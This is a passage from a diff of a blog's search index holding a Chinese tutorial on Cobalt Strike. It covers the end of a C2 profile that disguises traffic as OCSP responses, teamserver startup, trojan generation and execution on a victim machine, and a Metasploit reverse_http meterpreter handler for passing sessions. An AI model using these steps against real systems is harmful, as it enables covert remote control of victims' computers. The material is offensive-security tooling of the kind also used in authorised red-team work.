&#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
-<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
-<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
-<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
-<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
-<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
-<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
-<p>失败emmmm</p>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>Tools</category>
-      </categories>
-      <tags>
-        <tag>安全</tag>
-      </tags>
   </entry>
 </search>
